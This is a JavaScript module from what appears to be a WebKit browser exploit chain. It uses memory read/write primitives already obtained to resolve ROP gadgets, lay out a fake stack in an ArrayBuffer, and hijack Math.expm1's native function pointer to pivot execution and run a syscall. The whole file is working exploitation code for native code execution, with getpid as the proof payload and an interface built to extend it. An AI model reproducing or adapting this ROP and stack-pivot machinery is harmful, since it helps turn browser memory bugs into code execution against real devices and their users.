/**
 * Math.expm1 pivot native call — poops-style ROP (chain_poops.js).
 * Single-slab ctx = 1 leakval. stageGetpid + fireGetpid split for OOM headroom.
 */
import { int64 } from "./int64.js";
import { PIVOT_ROWS, verifyPivotSet } from "./pivot_gadgets.js";

export const SYS = { getpid: 20, getuid: 0x18 };

const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const STACK_SIZE = 0x800;
const SLAB_SIZE = OFF_STACK + STACK_SIZE;
const OFF_STORE = 0;
const OFF_PIVOT = 0x40;
const OFF_STACK = 0x100;
const OFF_FRAME = OFF_STACK + STACK_SIZE - 0x40;

const GADGET_TABLE = [
    ["POP_RDI_RET", "wk_POP_RDI_RET", [0x5f, 0xc3]],
    ["POP_RSI_RET", "wk_POP_RSI_RET", [0x5e, 0xc3]],
    ["POP_RDX_RET", "wk_POP_RDX_RET", [0x5a, 0xc3]],
    ["POP_RCX_RET", "wk_POP_RCX_RET", [0x59, 0xc3]],
    ["POP_R8_RET", "wk_POP_R8_RET", [null, 0x58, 0xc3]],
    ["POP_R9_RET", "wk_POP_R9_RET", [null, 0x59, 0xc3]],
    ["POP_RAX_RET", "wk_POP_RAX_RET", [0x58, 0xc3]],
    ["LEAVE_RET", "wk_LEAVE_RET", [0xc9, 0xc3]],
    ["MOV_RDI_RAX_RET", "wk_MOV_QWORD_PTR_RDI_RAX_RET", [0x48, 0x89, 0x07, 0xc3]],
    ["G0", "wk_MOV_RDI_RSI_30_CALL", [0x48, 0x8b, 0x7e, 0x30]],
    ["G1", "wk_POP_RAX_MOV_RAX_JMP_18", [0x58, 0x48, 0x8b, 0x07]],
    ["G2", "wk_PUSH_RBP_MOV_RBP_RSP_10", [0x55, 0x48, 0x89, 0xe5]],
    ["G3", "wk_MOV_RDI_RAX_8_CALL_20", [0x48, 0x8b, 0x78, 0x08]],
    ["G4", "wk_MOV_RDX_RAX_18_CALL_10", [0x48, 0x8b, 0x50, 0x38]],
    ["G5", "wk_PUSH_RDX_POP_RSP_RET", [0x52, 0x5c, 0xc3]],
];

export { verifyPivotSet, PIVOT_ROWS };

function resolveGadgetsTrust(webkitBase, off) {
    const G = {};
    for (let i = 0; i < GADGET_TABLE.length; i++) {
        const nm = GADGET_TABLE[i][0];
        const key = GADGET_TABLE[i][1];
        const rva = off[key];
        if (rva == null) return { G: null, bad: [nm] };
        G[nm] = webkitBase.add32(rva);
    }
    return { G, bad: [] };
}

function bufAddr(p, off, ab) {
    const c = p.leakval(ab);
    return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
        .add32(off.wk_ArrayBuffer_m_contents_m_data));
}

function put(dv, at, v) {
    if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
    } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
    }
}

function buildSlabCtx(p, off, G) {
    const pivotSp = off.pivot_view_sp;
    const PB_SIZE = Math.max(0x28, (pivotSp + 8 + 0xf) & ~0xf);
    const slab = new ArrayBuffer(SLAB_SIZE);
    const base = bufAddr(p, off, slab);
    const M = {
        slab,
        stackSize: STACK_SIZE,
        pivotSp,
        storeDv: new DataView(slab, OFF_STORE, 0x20),
        pivotDv: new DataView(slab, OFF_PIVOT, PB_SIZE),
        stackDv: new DataView(slab, OFF_STACK, STACK_SIZE),
        frameDv: new DataView(slab, OFF_FRAME, 0x40),
        stackU8: new Uint8Array(slab, OFF_STACK, STACK_SIZE),
        frameU8: new Uint8Array(slab, OFF_FRAME, 0x40),
        S: base.add32(OFF_STORE),
        P: base.add32(OFF_PIVOT),
        K: base.add32(OFF_STACK),
        F: base.add32(OFF_FRAME),
    };
    put(M.storeDv, 0x00, G.G1);
    put(M.storeDv, 0x08, M.P);
    put(M.storeDv, 0x10, G.G3);
    put(M.storeDv, 0x18, G.G2);
    put(M.pivotDv, 0x00, M.P);
    put(M.pivotDv, 0x10, G.G5);
    put(M.pivotDv, 0x20, G.G4);
    return M;
}

/** One slab + pivot handles — call at PRIMITIVE-OK while memory is fresh. */
export function prepNativeChain(p, off, webkitBase, cap) {
    if (!p || !off || !webkitBase)
        throw new Error("prepNativeChain: need p, off, webkitBase");
    const resolved = resolveGadgetsTrust(webkitBase, off);
    if (!resolved.G || resolved.bad.length)
        throw new Error("prepNativeChain: gadget-bad " + resolved.bad.join(","));
    const G = resolved.G;
    const M = buildSlabCtx(p, off, G);
    let mainMf, mainOrig, pivotObj, pivotCell;
    if (cap && cap.mainMf && cap.mainOrig != null && cap.pivotCell) {
        mainMf = cap.mainMf;
        mainOrig = cap.mainOrig;
        pivotObj = cap.pivotObj;
        pivotCell = cap.pivotCell;
    } else {
        const cell = p.leakval(Math.expm1);
        const jfn = p.read8(cell.add32(0x18));
        mainMf = jfn.add32(off.wk_JSFunction_m_function || 0x28);
        mainOrig = p.read8(mainMf);
        pivotObj = {};
        pivotCell = p.leakval(pivotObj);
    }
    return {
        M,
        G,
        mainMf,
        mainOrig,
        pivotCell,
        pivotObj,
        keepAlive: [M.slab, pivotObj],
        webkitBase,
        staged: false,
    };
}

export function layoutGetpidSlab(M, G, stub) {
    M.stackU8.fill(0);
    M.frameU8.fill(0);
    const at = STACK_SIZE - 0x38;
    put(M.stackDv, at + 0x00, stub);
    put(M.stackDv, at + 0x08, G.POP_RDI_RET);
    put(M.stackDv, at + 0x10, M.F);
    put(M.stackDv, at + 0x18, G.MOV_RDI_RAX_RET);
    put(M.stackDv, at + 0x20, G.POP_RAX_RET);
    put(M.stackDv, at + 0x28, JSVALUE_UNDEFINED);
    put(M.stackDv, at + 0x30, G.LEAVE_RET);
    put(M.pivotDv, M.pivotSp, M.K.add32(at));
}

/** Tap 1 — layout ROP stack + arm G0 (no expm1 yet). */
export function stageGetpid(p, prep, libkernelBase, off) {
    if (!prep || !prep.M || !prep.G)
        throw new Error("stageGetpid: no prep");
    const stubOff = (off.k_stubs && off.k_stubs[SYS.getpid]) || 0x2cb70;
    const stub = libkernelBase.add32(stubOff);
    layoutGetpidSlab(prep.M, prep.G, stub);
    p.write8(prep.mainMf, prep.G.G0);
    prep.staged = true;
}

/** Tap 2 — fire expm1 pivot + disarm. */
export function fireGetpid(p, prep) {
    if (!prep || !prep.M)
        throw new Error("fireGetpid: no prep");
    const saved = p.read8(prep.pivotCell);
    p.write8(prep.pivotCell, prep.M.S);
    Math.expm1(prep.pivotObj);
    p.write8(prep.pivotCell, saved);
    p.write8(prep.mainMf, prep.mainOrig);
    prep.staged = false;
    return prep.M.frameDv.getUint32(0, true) | 0;
}

/** Inline: stage + fire (use immediately after prep on Save bases). */
export function runGetpidFromPrep(p, prep, libkernelBase, off) {
    stageGetpid(p, prep, libkernelBase, off);
    return fireGetpid(p, prep);
}

export function initNativeCall(p, off, opts) {
    opts = opts || {};
    const prep = opts.prep;
    if (!prep)
        throw new Error("initNativeCall: use prepNativeChain + runGetpidFromPrep on HW");
    const lk = opts.libkernelBase;
    if (!lk)
        throw new Error("initNativeCall: libkernelBase required");
    return {
        webkitBase: opts.webkitBase,
        libkernelBase: lk,
        sc(num) {
            if (num !== SYS.getpid) throw new Error("getpid only");
            if (!prep.staged)
                stageGetpid(p, prep, lk, off);
            return { i32: fireGetpid(p, prep) };
        },
        disarm() {
            if (prep.staged) {
                try { p.write8(prep.mainMf, prep.mainOrig); } catch (_) { }
                prep.staged = false;
            }
        },
    };
}

export function runGetpidProof(p, off, opts) {
    opts = Object.assign({ trust: true, noStubScan: true }, opts || {});
    const webkitBase = opts.webkitBase
        || (opts.nativeFn && off.wk_expm1_builtin
            ? opts.nativeFn.sub32(off.wk_expm1_builtin) : null);
    const prep = opts.prep || prepNativeChain(p, off, webkitBase);
    const lk = opts.libkernelBase;
    const pid = runGetpidFromPrep(p, prep, lk, off);
    return { ok: pid > 0, pid, uid: null, chain: null };
}
